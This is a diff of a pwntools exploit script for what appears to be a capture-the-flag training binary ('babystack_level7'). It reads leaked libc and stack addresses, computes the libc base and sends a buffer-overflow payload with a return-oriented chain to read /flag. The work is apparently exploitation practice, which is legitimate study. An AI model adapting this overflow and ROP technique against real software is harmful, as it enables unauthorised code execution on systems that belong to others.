@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template babystack_level8
+# $ pwn template babystack_level7
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '/challenge/babystack_level8')
+exe = context.binary = ELF(args.EXE or '/challenge/babystack_level7')
 context.terminal = ["tmux", "splitw", "-h"]
-
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
+
 
 
 def start(argv=[], *a, **kw):
@@ -36,9 +36,10 @@ continue
 # RELRO:    Partial RELRO
 # Stack:    No canary found
 # NX:       NX enabled
-# PIE:      No PIE (0x400000)
+# PIE:      PIE enabled
 
-def rop(base):
+
+def rop(base, rbp):
     pop_rdi = [base+0x23b6a, rbp]
     pop_rsi = [base+0x2601f, 0x4]
     syscall = [base+0x10db60] 
@@ -46,26 +47,16 @@ def rop(base):
     return chain 
 
 io = start()
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-io.recvuntil(b'base pointer rbp: ')
-rbp = int(io.recvline(keepends=False), 16)
-io.sendline(hex(rbp+8))
-io.recvuntil(b"is: ")
-leak = io.recvline()
+io.recvuntil(b"libc is located at ")
+libc_sys = int(io.recvline(keepends=False), 16)
+io.recvuntil(b"base pointer rbp: ")
+bp = int(io.recvline(keepends=False), 16)
 io.recvuntil(b"will be stored: ")
 buf = int(io.recvline(keepends=False), 16)
-base = int(leak[:-1],16) - 0x23f90 - 0xF3
-print(base)
-payload = b'a'*(rbp-buf)+b'/flag' +b'\0'*3 + rop(base)
+libc_base = libc_sys - 0x52290 
+payload = b'a'*(bp-buf)+b'/flag' +b'\0'*3 + rop(libc_base, bp)
+io.sendline(payload)
 
-io.send(payload)
 io.interactive()
+
 
